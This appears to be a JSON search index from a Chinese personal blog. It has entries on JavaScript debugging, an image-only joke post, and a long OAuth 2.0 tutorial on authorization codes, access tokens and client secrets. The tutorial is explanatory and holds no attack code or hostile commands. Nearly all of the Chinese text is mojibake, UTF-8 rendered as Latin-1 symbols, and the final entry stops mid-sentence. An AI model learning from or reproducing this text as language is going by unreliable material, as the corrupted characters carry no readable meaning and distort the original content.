[{"title":"jsè°ƒè¯•","url":"/2025/06/27/jsè°ƒè¯•/","content":"\njsè°ƒè¯•çš„ç›®çš„ ï¼Ÿ\n\næœ‰åŠ è§£å¯†æ•°æ® éœ€è¦æˆ‘ä»¬å»è§£å¯†\n","tags":["-js"]},{"title":"æ¶è‡­h1php0qæœ›å‘¨çŸ¥","url":"/2025/06/20/æ¶è‡­h1php0qæœ›å‘¨çŸ¥/","content":"\n![image-20250620095958480](http://images.lwwww.top/images/20250620100030293.png)\n","tags":["-æ¥çœ‹ä¸ªç¬‘è¯"]},{"title":"Oauthè®¤è¯","url":"/2025/06/17/Oauthè®¤è¯/","content":"\n#### å‰è¨€\n\nä¸€å¼€å§‹å…­æœˆåˆå­¦äº†ä¸€æ¬¡Oauthï¼Œç„¶åæ²¡å­¦æ˜ç™½ï¼Œä»€ä¹ˆä»€ä¹ˆcode sessionçš„è®²çš„å¥½ä¹± çœ‹äº†å‡ ä¸ªæ–‡ç« å…¶å®å¾ˆæ¸…æ¥š ä½†æ˜¯ä»–ä»¬çš„å­—æ‹¼å‡‘åœ¨ä¸€èµ·å°±ç‰¹åˆ«éš¾ä»¥ç†è§£ åŒ…æ‹¬åæ¥çœ‹çš„burpé¶åœºé‡Œé¢æœ‰ä¸€ä¸ªOauthçš„è®²è§£ï¼Œä¹Ÿæ˜¯æ‹ä¸æ¸…æ¥šä¸€ç›´åˆ°æ˜¨å¤©ç½‘ä¸Šå¬åŒ—å±±å›¢é˜Ÿçš„é™ˆå¹¿å¸ˆå‚…è®²äº†ä¸€éå‰ç«¯Oauthï¼Œæ‰ç¼“æ…¢ååº”è¿‡æ¥ã€‚\n\nOAuthæ˜¯ä¸€ä¸ªåœ¨ä¸æä¾›ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹ï¼Œæˆæƒç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®webèµ„æºçš„å®‰å…¨åè®® OAuthæœ¬èº«è€Œè¨€æ˜¯ä¸€å¥—å¾ˆä¸¥è°¨çš„ç»“æ„ã€‚\n\nå…ˆæŠŠæˆ‘è®¤ä¸ºçš„å¥½æ–‡ç« åˆ†äº«ä¸€ä¸‹æ”¾åˆ°è¿™é‡Œ\n\n[é˜®ä¸€å³°çš„ç†è§£Oauth](https://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html)\n\n[OAuth2.0å…¥é—¨ï¼ˆä¸€ï¼‰â€”â€” åŸºæœ¬æ¦‚å¿µè¯¦è§£å’Œå›¾æ–‡å¹¶èŒ‚è®²è§£å››ç§æˆæƒç±»å‹](https://blog.csdn.net/qq_37771475/article/details/103288957?fromshare=blogdetail&sharetype=blogdetail&sharerId=103288957&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\n[Burpsuiteé¶åœºä¹‹OAuth2.0æ¼æ´åŠåˆ©ç”¨åˆæ¢](https://blog.csdn.net/qq_28092985/article/details/121460422?fromshare=blogdetail&sharetype=blogdetail&sharerId=121460422&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\nä¸€è¯´èµ·æ¥Oauthå¯èƒ½ä¸ç†Ÿæ‚‰å¾ˆé™Œç”Ÿé‚£ä¹ˆç›´æ¥ä¸Šæˆªå›¾å°±è®¤è¯†äº†\n\n![image-20250617154810712](http://images.lwwww.top/images/20250617154820197.png)\n\n![image-20250617154904480](http://images.lwwww.top/images/20250617154906720.png)\n\n\n\nç°åœ¨å°±åº”è¯¥å¾ˆç†Ÿæ‚‰äº† éšå¤„å¯è§ çš„oauth é‚£ä¹ˆå†æ¥ç†è§£ä¸€ä¸‹å®šä¹‰å°±å¾ˆæ¸…æ™°äº†\n\n```\nOAuth æ˜¯ä¸€ç§å¸¸ç”¨çš„æˆæƒæ¡†æ¶ï¼Œå®ƒä½¿ç½‘ç«™å’Œ Web åº”ç”¨ç¨‹åºèƒ½å¤Ÿè¯·æ±‚å¯¹å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸Šçš„ç”¨æˆ·å¸æˆ·è¿›è¡Œæœ‰é™è®¿é—®ã€‚\n```\n\n## ç®€å•ä»‹ç» Oauth2.0 åŸç†\n\næœ‰ä¸¤å®¶äº’è”ç½‘ä¼ä¸š A å’Œ Bï¼Œå…¶ä¸­ B æ˜¯ä¸€å®¶æä¾›ç›¸ç‰‡äº‘å­˜å‚¨çš„å…¬å¸ã€‚ç”¨æˆ·å¯ä»¥æŠŠç›¸ç‰‡ä¸Šä¼ åˆ° B ç½‘ç«™ä¸Šé•¿æœŸä¿å­˜ï¼Œç„¶åå¯ä»¥åœ¨ä¸åŒçš„è®¾å¤‡ä¸ŠæŸ¥çœ‹ã€‚æŸä¸€å¤©ï¼ŒA å’Œ B è°ˆæˆäº†ä¸€é¡¹åˆä½œï¼šå¸Œæœ›ç”¨æˆ·åœ¨ä½¿ç”¨ A ç½‘ç«™æ—¶ï¼Œä¹Ÿå¯ä»¥è§‚çœ‹ä»–åœ¨ B çš„ç›¸ç‰‡ã€‚è¿™ä¸ªæŠ€æœ¯ä¸Šè¦æ€ä¹ˆå®ç°å‘¢ï¼Ÿ\n\nã€€ã€€é€‰é¡¹ä¸€ï¼šç”± B æä¾›ä¸€ä¸ªæ¥å£ï¼š\n\n \n\nã€€ã€€GET /photos?account=\n\nã€€ã€€å‚æ•°ï¼š\n\nã€€ã€€ã€€ã€€account ï¼š B è´¦å·\n\nã€€ã€€è¿”å›ï¼š\n\nã€€ã€€ã€€ã€€æŒ‡å®šè´¦å·ä¸‹çš„æ‰€æœ‰ç›¸ç‰‡\n\n \n\nã€€ã€€æœ‰äº†è¿™ä¸ªæ¥å£ï¼ŒA ç½‘ç«™åªéœ€åœ¨ç•Œé¢ä¸Šæ˜¾ç¤ºä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè®©ç”¨æˆ·è¾“å…¥ä»–çš„ B è´¦å·ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªæ¥å£æ¥è·å–ç›¸ç‰‡å°±å¯ä»¥äº†ã€‚\n\nã€€ã€€è¿™æ ·å¯è¡Œå—ï¼Ÿ\n\nå›ç­”å½“ç„¶æ˜¯\n\nNOï¼ä¸ºå•¥ï¼Ÿ\n\nã€€ã€€å› ä¸ºå®ç°å¹¶å¼€æ”¾è¿™æ ·ä¸€ä¸ªæ¥å£ï¼Œç›¸å½“äºç›´æ¥æŠŠ B å…¬å¸çš„ç›¸ç‰‡èµ„æºå…¨éƒ¨æš´éœ²åœ¨äº’è”ç½‘ä¸­ï¼Œè™½ç„¶å¹¶æ²¡æœ‰å…¬å¼€ï¼Œä½†æ˜¯å¯¹äºæœ‰ç‚¹å®‰å…¨æ„è¯†çš„æŠ€æœ¯äººå‘˜æ¥è¯´ï¼Œè¦å‘ç°è¿™ä¸ªæ¥å£ç®€ç›´è½»è€Œæ˜“ä¸¾ã€‚è¿™æ ·çš„è¯ï¼ŒB çš„ç”¨æˆ·å°±æ²¡æœ‰ä»»ä½•éšç§äº†ã€‚\n\nã€€ã€€é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™æ ·å§ï¼Œä¸ºäº†ä¿è¯ä¸èƒ½éšä¾¿è·å–åˆ«äººçš„ç›¸ç‰‡ï¼Œæˆ‘ä»¬æŠŠæ¥å£æ”¹æˆè¿™æ ·ï¼š\n\nã€€ã€€`GET /photos?account=&pwd=`\n\nã€€ã€€é™¤äº†è¦æ±‚ç”¨æˆ·è¾“å…¥è´¦å·ï¼Œè¿˜è¦è¾“å…¥å¯†ç ã€‚åªæœ‰å½“è´¦å·å¯†ç éªŒè¯é€šè¿‡ï¼Œæ‰è¿”å›è¯¥è´¦å·ä¸‹çš„æ‰€æœ‰ç›¸ç‰‡ã€‚è¿™æ ·ï¼Œå³ä½¿é»‘å®¢å‘ç°äº†è¿™ä¸ªæ¥å£ï¼Œä»–ä¸çŸ¥é“ç”¨æˆ·çš„å¯†ç ï¼Œæ‰€ä»¥æ²¡åŠæ³•çªƒå–ç”¨æˆ·çš„ç›¸ç‰‡äº†ã€‚è¿™æ · OK äº†å§ï¼Ÿ\n\nã€€ã€€ç­”æ¡ˆè¿˜æ˜¯ NOï¼ç»ä¸å¯ä»¥è¿™ä¹ˆåšï¼\n\nã€€ã€€ä¸ºä»€ä¹ˆï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªä¿¡ä»»é—®é¢˜ã€‚å¦‚æœè¿™æ ·å®ç°ï¼Œé‚£ä¹ˆï¼Œç”¨æˆ·å¿…é¡»åœ¨ A çš„ç½‘ç«™é‡Œè¾“å…¥ä»–åœ¨ B  çš„è´¦å·å’Œå¯†ç ã€‚å¦‚æœä½ æ˜¯ä¸€ä¸ªéšç§æ„è¯†å¾ˆå¼ºçš„äººï¼Œä½ å¾ˆå¯èƒ½ä¼šé—®ï¼šâ€œå‡­ä»€ä¹ˆæˆ‘è¦æŠŠ B çš„è´¦å·å¯†ç å‘Šè¯‰ A  ï¼Ÿâ€è¿™é‡Œï¼Œä»ç”¨æˆ·çš„è§’åº¦å°±å·²ç»æ„Ÿå—åˆ°ä¸€ç§ä¸å®‰å…¨æ„Ÿï¼Œå‡­ä»€ä¹ˆè®©æˆ‘ä¿¡ä»»ä½  Aï¼Œä½ ä¿è¯ä¸æ‹¿æˆ‘çš„ B è´¦å·å¯†ç å»å¹²åäº‹ï¼Ÿè€Œæ›´æ·±ä¸€å±‚æ¬¡ï¼Œç«™åœ¨ B  çš„è§’åº¦æ¥è€ƒè™‘çš„è¯ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„é—®é¢˜ï¼šæˆ‘å‡­ä»€ä¹ˆç»å¯¹ä¿¡ä»» Aï¼Ÿå¦‚æœ A åœ¨æ¥æ”¶åˆ°ç”¨æˆ·çš„è¾“å…¥ä¹‹åï¼Œé©¬ä¸Šå°±æŠŠè¯·æ±‚å‘åˆ°æˆ‘ä»¬è¿™é‡Œæ¥ï¼Œé‚£æ˜¯ ok çš„ã€‚ä½†æ˜¯ä¸‡ä¸€ A åœ¨è¿™ä¸ªè¿‡ç¨‹å·å·æŠŠè´¦å·å¯†ç å­˜èµ·æ¥äº†å‘¢ï¼Ÿé‚£éšç€æ—¶é—´çš„æ¨ç§»ï¼ŒA å°±æ…¢æ…¢åœ°æœé›†åˆ°ä¸€å¤§æ‰¹ B çš„è´¦å·å¯†ç ï¼è¿™å¯¹ B æ¥è®²ï¼Œæ˜¯ä¸èƒ½æ¥å—çš„ï¼\n\nã€€ã€€é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nã€€ã€€æˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™ä¸ªé—®é¢˜äº§ç”Ÿçš„åŸå› ï¼Œä¸»è¦æ˜¯åœ¨äº Aã€Bã€ç”¨æˆ· ä¸‰æ–¹çš„äº¤äº’æ¨¡å‹æœ‰é—®é¢˜ã€‚è¯·çœ‹ï¼š\n\n![image-20250618154857960](http://images.lwwww.top/images/20250618154906518.png)\n\n\n\nåœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œç”¨æˆ·éœ€è¦è®¿é—®ä»–åœ¨ B çš„ç›¸ç‰‡èµ„æºï¼Œä½†æ˜¯ä»–ä¸èƒ½ç›´æ¥å’Œ B æ‰“äº¤é“ï¼Œè€Œæ˜¯å¿…é¡»é€šè¿‡ Aã€‚åœ¨è¿™ä¸ªå‰æä¸‹å»è€ƒè™‘é—®é¢˜ï¼Œæ— è®ºå¦‚ä½•æ— æ³•æƒ³å‡ºä¸€ä¸ªæ—¢èƒ½å®ç°åŠŸèƒ½ï¼Œåˆèƒ½è®©ç”¨æˆ·å’Œ B éƒ½æ„Ÿåˆ°æ”¾å¿ƒçš„å®ç°æ–¹æ¡ˆã€‚\n\nã€€ã€€Oauth2.0 å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œæå‡ºæ¥çš„äº¤äº’æ¨¡å‹ã€‚å®ƒå‘Šè¯‰äººä»¬ï¼Œåœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œä¸‰æ–¹è¦æ€ä¹ˆæ‰“äº¤é“ï¼Œæ‰èƒ½åšåˆ°å®‰å…¨ã€åˆç†ã€‚\n\nã€€ã€€å…·ä½“æ¥è¯´ï¼ŒOauth2.0 çš„äº¤äº’æ¨¡å‹çš„æ ¸å¿ƒæ˜¯è¿™ä¸ªæ ·å­çš„ï¼š\n\n![419544-20200309133048748-1286812626](http://images.lwwww.top/images/20250618154947282.png)\n\nã€€è§£é‡Šä¸€ä¸‹å‡ ä¸ªæœ¯è¯­ã€‚\n\nã€€ã€€èµ„æºæœåŠ¡å™¨ã€‚å³èµ„æºçš„å­˜æ”¾åœ°ç‚¹ï¼Œæˆ–è€…è¯´èµ„æºçš„è®¿é—®å…¥å£ã€‚åœ¨ä¾‹å­ä¸­ï¼Œèµ„æºæœåŠ¡å™¨å³ get photos æ¥å£æ‰€éƒ¨ç½²çš„æœåŠ¡å™¨ã€‚A å¿…é¡»ç»ç”±è¿™é‡Œå»è®¿é—®èµ„æºã€‚\n\nã€€ã€€é‰´æƒæœåŠ¡å™¨ã€‚è¿™æ˜¯ä¸€ä¸ªå¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œè®¤è¯ã€å¹¶å¯¹ A è¿›è¡Œæˆæƒçš„åœ°æ–¹ã€‚è¿™ä¹Ÿæ˜¯ Oauth2.0 çš„å…³é”®èŠ‚ç‚¹ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œé‰´æƒæœåŠ¡å™¨ä¹Ÿæ˜¯å±äº B å…¬å¸çš„ã€‚\n\n \n\nã€€ã€€å¥½ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æ•´ä¸ªäº¤äº’è¿‡ç¨‹æ˜¯æ€æ ·çš„ã€‚\n\nã€€ã€€é¦–å…ˆï¼ŒåŒæ ·æ˜¯ç”¨æˆ·åœ¨è®¿é—® A çš„ç½‘ç«™ï¼Œç„¶åï¼ŒA éœ€è¦è®¿é—® B ç”¨æˆ·çš„ç›¸ç‰‡ã€‚è¿™ä¸ªæ—¶å€™ï¼ŒA å¹¶ä¸æ˜¯å±•ç¤ºä¸€ä¸ªè¾“å…¥æ¡†ç»™ç”¨æˆ·ï¼Œè€Œæ˜¯æ‰“å¼€ä¸€ä¸ªé¡µé¢ã€‚è¿™ä¸ªé¡µé¢å°±æ˜¯ B éƒ¨ç½²åœ¨é‰´æƒæœåŠ¡å™¨ä¸Šé¢çš„ä¸€ä¸ªé‰´æƒé¡µé¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå®ƒé•¿å¾—ç±»ä¼¼ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š![222134572926598](http://images.lwwww.top/images/20250618155039011.jpg)\n\nä¸Šé¢è¿™ä¸ªæ˜¯è…¾è®¯ç»™æœ‰é“äº‘ç¬”è®°è¿›è¡Œæˆæƒçš„é¡µé¢ã€‚è¿™é‡Œï¼Œè…¾è®¯å°±æ˜¯ Bï¼Œæœ‰é“äº‘ç¬”è®°å°±æ˜¯ Aã€‚ï¼ˆè¿™é¡µé¢æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿåœ¨å“ªè§è¿‡ï¼Ÿæœ‰å…´è¶£äº†è§£ä¸€ä¸‹è´¦å·æ¥å‡ºçš„åŸç†ï¼Œå…¶å®å°±æ˜¯Oauth2.0ã€‚ï¼‰\n\nã€€ã€€è¿™ä¸ªé¡µé¢æœ‰ä¸¤ä¸ªè¦ç´ ï¼š\n\nã€€ã€€1ï¼Œæœ‰è®¤è¯æœºåˆ¶ã€‚åœ¨è…¾è®¯è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½ éœ€è¦è¾“å…¥QQè´¦å·å¯†ç ï¼Œè¯æ˜ä½ æ˜¯ä¸€ä¸ªåˆæ³•çš„QQç”¨æˆ·\n\nã€€ã€€2ï¼Œå±•ç¤ºäº†æˆæƒä¿¡æ¯ã€‚çœ‹é¡µé¢å³æ–¹â€œæœ‰é“äº‘ç¬”è®°å°†è·å¾—ä»¥ä¸‹æƒé™â€éƒ¨åˆ†ã€‚è¿™æ˜¯åœ¨å‘Šè¯‰ç”¨æˆ·ï¼Œå¦‚æœä½ æˆæƒç»™ Aï¼Œé‚£ä¹ˆï¼ŒA å°†è·å¾—è®¿é—®ä½ è¿™äº›èµ„æºçš„æƒé™\n\nã€€ã€€æ³¨æ„ï¼Œè¿™ä¸ªé¡µé¢æ˜¯éƒ¨ç½²åœ¨ B çš„é‰´æƒæœåŠ¡å™¨ä¸Šï¼Œæ‰€æœ‰ç”¨æˆ·è¾“å…¥çš„è´¦å·å¯†ç æ˜¯ç›´æ¥æäº¤ç»™ Bï¼ŒA æ˜¯æ²¡æœ‰ä»»ä½•æœºä¼šæ‹¿åˆ°çš„ã€‚\n\nã€€ã€€å¦‚æœç”¨æˆ·åŒæ„æˆæƒå¹¶ä¸”è®¤è¯é€šè¿‡ï¼Œé‚£ä¹ˆï¼Œæ¥ä¸‹æ¥é‰´æƒæœåŠ¡å™¨ä¼šé€šçŸ¥ Aï¼Œå¹¶ç»™ A å‘é€ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼Œå…¶å®å°±æ˜¯ä¸€æ®µå…¨å±€å”¯ä¸€çš„éšæœºå­—ç¬¦ä¸²ï¼‰ã€‚æœ‰äº†è¿™ä¸ªè®¿é—®ä»¤ç‰Œï¼ŒA å°±å¯ä»¥æ‹¿ç€å®ƒå»æ‰¾èµ„æºæœåŠ¡å™¨è¦èµ„æºäº†ã€‚\n\nã€€ã€€æ‰€ä»¥ï¼Œè·å–ç›¸ç‰‡çš„æ¥å£ä¼šæ˜¯ç±»ä¼¼è¿™ä¸ªå½¢å¼ï¼ˆå®é™…å½“ä¸­ä¸ä¼šæŠŠ access token æ”¾åœ¨ query string ä¸­ï¼Œè¿™é‡Œåšäº†ç®€åŒ–ï¼‰ï¼š\n\n \n\nã€€ã€€GET /photos?accesstoken=\n\n \n\nã€€ã€€èµ„æºæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä¹‹åï¼Œä¼šæ‹¿ç€ access tokenï¼Œå†å»æ‰¾é‰´æƒæœåŠ¡å™¨ï¼Œæ£€æŸ¥è¿™ä¸ª access token çš„åˆæ³•æ€§å’Œæƒé™ï¼Œå¦‚æœé€šè¿‡çš„è¯ï¼Œæ‰è¿”å›èµ„æºç»™ Aã€‚\n\n \n\nã€€ã€€å¦‚æ­¤ï¼Œå³å®ç°äº†åŠŸèƒ½ï¼Œä¹Ÿä¿éšœäº†å®‰å…¨æ€§ã€‚ä¸è¿‡ä½ å¯èƒ½ä¼šé—®ï¼Œè¿™ä¸ª access token å’Œè´¦å·å¯†ç çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿéƒ½æ˜¯ä»£è¡¨ç”¨æˆ·èº«ä»½çš„ï¼Œä¸ºä»€ä¹ˆ access token å°±æ›´å®‰å…¨ï¼Ÿç­”æ¡ˆæ˜¯ï¼š\n\nã€€ã€€1ï¼Œè´¦å·å¯†ç æ˜¯ä¸€åˆ‡ï¼Œæœ‰äº†è´¦å·å¯†ç å°±å‡ ä¹å¯ä»¥åšä»»ä½•äº‹æƒ…ï¼ˆç”šè‡³æ”¹æ‰åŸå¯†ç ï¼‰ã€‚è€Œ access token æ˜¯æœ‰é™åˆ¶èŒƒå›´çš„ã€‚æ¯ä¸ª access token éƒ½æœ‰ä¸€ä¸ª scopeï¼Œä¹Ÿå°±æ˜¯å…è®¸æ‰§è¡Œå“ªäº›æ“ä½œã€‚\n\nã€€ã€€2ï¼Œaccess token æ˜¯æœ‰æœ‰æ•ˆæœŸçš„ã€‚å¦‚æœ access token è¢«çªƒå–ï¼Œä¹Ÿä¸èƒ½ä¸€ç›´ç”¨ã€‚\n\n### Authorization Code æˆæƒåŸç†å’Œå®ç°æ–¹æ³•\n\nOauth2.0 å®šä¹‰äº†å‡ ç§æˆæƒæµç¨‹ï¼Œå…¶ä¸­æœ€é‡è¦ã€ä¹Ÿæœ€åŸºç¡€çš„æ˜¯ Authorization Code æˆæƒã€‚ä¹Ÿå°±æ˜¯æˆæƒç ç±»å‹å…ˆçœ‹æµç¨‹å›¾ï¼š\n\n#### æˆæƒç ç±»å‹\n\n![419544-20210609172848603-384012851](D:/lwwblog/source/images/202502/419544-20210609172848603-384012851.png)\n\n1ï¼Œç”¨æˆ·è®¿é—® A ç½‘ç«™\n\nã€€ã€€2ï¼ŒA æ‰“å¼€ B çš„æˆæƒé¡µé¢\n\nã€€ã€€3ï¼Œç”¨æˆ·çœ‹åˆ°æˆæƒç•Œé¢ï¼Œè¾“å…¥è´¦å·å¯†ç è¿›è¡Œæˆæƒ\n\nã€€ã€€4ï¼ŒB éªŒè¯ç”¨æˆ·æ˜¯åˆæ³•çš„ä¹‹åï¼Œç”Ÿæˆä¸€ä¸ª authorization codeï¼Œç„¶åé€šè¿‡ 302 è·³è½¬çš„æ–¹å¼ï¼ŒæŠŠè¿™ä¸ª code å‘é€ç»™ A\n\nã€€ã€€5ï¼ŒA ç”¨è¿™ä¸ª code è°ƒç”¨ B çš„ apiï¼Œè·å¾— access token\n\nã€€ã€€6ï¼ŒA ç”¨ access token è®¿é—®èµ„æº\n\n \n\nã€€ã€€é—®é¢˜æ¥äº†ï¼Œ**authorization code æ˜¯ä»€ä¹ˆï¼Ÿ**\n\nã€€ã€€- code ä¸€ä¸ªä¸€æ¬¡æ€§çš„ä¸´æ—¶å‡­è¯ï¼Œå¯ä»¥ç”¨å®ƒæ¥å…‘æ¢ access token\n\nã€€ã€€- code æ˜¯ç”±é‰´æƒæœåŠ¡å™¨ç”Ÿæˆçš„ä¸€ä¸ªéšæœºä¸”å”¯ä¸€çš„å­—ç¬¦ä¸²\n\nã€€ã€€- é‰´æƒæœåŠ¡å™¨ä¼šè®°å½•ä¸‹ code çš„ç”Ÿæˆæ—¶é—´ã€å°†è¦å…‘æ¢ç»™è°ï¼ˆä¾‹å­é‡Œæ˜¯ Aï¼‰ã€æˆæƒçš„ç”¨æˆ·æ˜¯è°\n\nã€€ã€€- åœ¨ç¬¬ 5 æ­¥ï¼Œé‰´æƒæœåŠ¡å™¨ä¼šéªŒè¯ A çš„èº«ä»½ï¼Œå¹¶ä¸”æ£€æŸ¥ code çš„æœ‰æ•ˆæœŸã€‚é€šè¿‡çš„è¯å°±ä¼šç”Ÿæˆ access token\n\nã€€ã€€- code æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œåœ¨ç¬¬ 5 æ­¥æˆåŠŸæ¢å– access token ä¹‹åå°±ä¼šä½œåºŸ\n\nã€€ã€€- code çš„æœ‰æ•ˆæœŸéå¸¸çŸ­ï¼Œå¯èƒ½ä¸ä¼šè¶…è¿‡ 1 åˆ†é’Ÿã€‚A åœ¨ç¬¬ 4 æ­¥è·å–åˆ° code ä¹‹åï¼Œè¦ç«‹åˆ»èµ°ç¬¬ 5 æ­¥\n\n **å½“ç„¶è¿™äº›æƒ…å†µå¹¶ä¸æ˜¯ç»å¯¹çš„è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæŠŠä»–ä»¬å•æ‹¿å‡ºæ¥å¼ºè°ƒ**\n\nã€€ã€€ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ 4 æ­¥ç›´æ¥æŠŠ access token å‘é€ç»™ Aï¼Œè€Œè¦é€šè¿‡çœ‹ä¼¼å¤šä½™çš„ code å†è½¬æ¢ä¸€ä¸‹ï¼Œæè¿™ä¹ˆå¤æ‚å‘¢ï¼Ÿè¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆéå¸¸é‡è¦ï¼Œæ˜¯æ•´ä¸ªæˆæƒæµç¨‹çš„å…³é”®æ‰€åœ¨ã€‚\n\nã€€ã€€å¦‚æœåœ¨ç¬¬ 4 æ­¥ç›´æ¥æŠŠ access token å‘é€ç»™ Aï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ\n\nã€€ã€€é—®é¢˜å°±æ˜¯ï¼Œç¬¬ 4 æ­¥æ˜¯ä¸€ä¸ª 302 è·³è½¬ï¼Œå¦‚æœåœ¨ç¬¬ 4 æ­¥ä¼ é€’ access tokenï¼Œä¼šå¯¼è‡´ access token æš´éœ²åœ¨ url ä¸­ï¼Œè¿™æ˜¯éå¸¸ä¸å®‰å…¨çš„æ–¹å¼ï¼Œå› ä¸º url å¾ˆå®¹æ˜“æ•æ‰åˆ°ã€‚\n\n \n\nã€€ã€€æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åœ¨ç¬¬ 4 æ­¥ç›´æ¥ä¼ é€’ access tokenã€‚é‚£æ¢æˆä¸€ä¸ª codeï¼Œå†ç”¨ code å»æ¢ï¼Œå°±æ›´å®‰å…¨äº†å—ï¼Ÿä½ å¯ä»¥èƒ½ä¼šé—®ï¼Œcode åŒæ ·ä¼šæ³„æ¼ï¼Œé‚£æ”»å‡»è€…æ‹¿åˆ° codeï¼Œä¹Ÿå¯ä»¥ç”¨ code å»æ¢ access tokenï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\n\nã€€ã€€åŒºåˆ«åœ¨äºï¼Œæ”»å‡»è€…æ‹¿åˆ° code æ˜¯ä¸èƒ½æ‹¿å»æ¢ access token çš„ï¼Œä¸¤ä¸ªåŸå› ï¼š\n\nã€€ã€€1ï¼Œä¸Šé¢è¯´äº†ï¼Œæ¢å– access token çš„æ—¶å€™ï¼Œé‰´æƒæœåŠ¡å™¨ä¼šéªŒè¯ A çš„èº«ä»½ã€‚å…·ä½“æ€ä¹ˆéªŒè¯ï¼Œåœ¨åé¢è¯´æ˜ã€‚\n\nã€€ã€€2ï¼Œcode çš„æœ‰æ•ˆæœŸæçŸ­ï¼Œç•™ç»™æ”»å‡»è€…çš„æ—¶é—´æçŸ­\n\nã€€ã€€å¦å¤–ï¼Œå³ä¾¿æ”»å‡»è€…æˆåŠŸçªç ´äº†ä¸Šé¢ä¸¤ä¸ªé™åˆ¶ï¼Œæ‹¿åˆ°äº† access tokenï¼Œé‰´æƒæœåŠ¡å™¨ä¹Ÿèƒ½å¾ˆå¿«å‘ç°ã€‚è¿™æ˜¯å› ä¸ºï¼Œæ”»å‡»è€…å¿…é¡»æŠ¢åœ¨ A  ä¹‹å‰å»å…‘æ¢ access tokenã€‚é‚£ä¹ˆï¼Œç­‰åˆ° A èµ°ç¬¬ 5 æ­¥çš„æ—¶å€™ï¼Œé‰´æƒæœåŠ¡å™¨å°±ä¼šå‘ç°ï¼Œè¿™ä¸ª code  å·²ç»è¢«ç”¨è¿‡äº†ã€‚æ­¤æ—¶è¿™å°±æ˜¯ä¸€ä¸ªæ”»å‡»å·²ç»å‘ç”Ÿçš„ä¿¡å·ï¼šæœ‰ä¸¤ä¸ªä¸åŒçš„æœåŠ¡å™¨ï¼Œå°è¯•ç”¨åŒä¸€ä¸ª code æ¥å…‘æ¢ access  tokenï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸åº”è¯¥å‘ç”Ÿçš„ã€‚æ­¤æ—¶é‰´æƒæœåŠ¡å™¨å¯ä»¥ç«‹åˆ»é‡‡å–æªæ–½ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥æŠŠåˆšæ‰å…‘æ¢å‡ºå»çš„ access token  ä½œåºŸã€‚æ‰€ä»¥ï¼Œæå‡ºæ¥ä¸€ä¸ª codeï¼Œç¡®å®ä¼šå®‰å…¨å¾ˆå¤šã€‚\n\n \n\nã€€ã€€é‚£ä¹ˆï¼Œæ€ä¹ˆéªŒè¯ A çš„èº«ä»½å‘¢ï¼Ÿ\n\n \n\nã€€ã€€æ‰€æœ‰çš„ Aï¼Œåº”è¯¥è¯´éƒ½æ˜¯ B çš„åˆä½œæ–¹ã€‚é‚£ä¹ˆåœ¨å¼€å§‹åˆä½œä¹‹å‰ï¼Œä¸€å®šéœ€è¦åšä¸€äº›å‰æœŸçš„å‡†å¤‡ã€‚å…·ä½“æ¥è¯´ï¼ŒB é€šå¸¸ä¼šæä¾›ä¸€ä¸ªç”³è¯·ç½‘ç«™ï¼ŒA  é€šè¿‡è¿™ä¸ªç½‘ç«™å¡«å†™ä¸€äº›ä¿¡æ¯ï¼Œæäº¤åˆä½œç”³è¯·ã€‚B çš„å·¥ä½œäººå‘˜ä¼šå®¡æ ¸ï¼Œé€šè¿‡ä¹‹åï¼Œç³»ç»Ÿä¼šç»™ A è‡ªåŠ¨åˆ†é…ä¸€ä¸ª client_id å’Œä¸€ä¸ª  client_secretã€‚client_id å°±æ˜¯ä¸€ä¸ªå”¯ä¸€ idï¼Œclient_secret æ˜¯ä¸€ä¸ªå¯†é’¥ã€‚A éœ€è¦æŠŠ  client_secret å¦¥å–„ä¿ç®¡åœ¨æœåŠ¡å™¨ä¸Šï¼Œä¸èƒ½æ³„éœ²ã€‚åœ¨ç”¨ code å…‘æ¢ access token çš„æ—¶å€™ï¼Œéœ€è¦ç”¨è¿™ä¸ª  client_secret å¯¹è¯·æ±‚ç”Ÿæˆ MACï¼ˆæ¶ˆæ¯éªŒè¯ç ï¼‰ã€‚é‰´æƒæœåŠ¡å™¨å°±æ˜¯ä¾é è¿™ä¸ª MAC æ¥éªŒè¯ A çš„èº«ä»½çš„ã€‚\n\nã€€ã€€è¿™é‡Œéœ€è¦ç”¨åˆ°å¯†ç 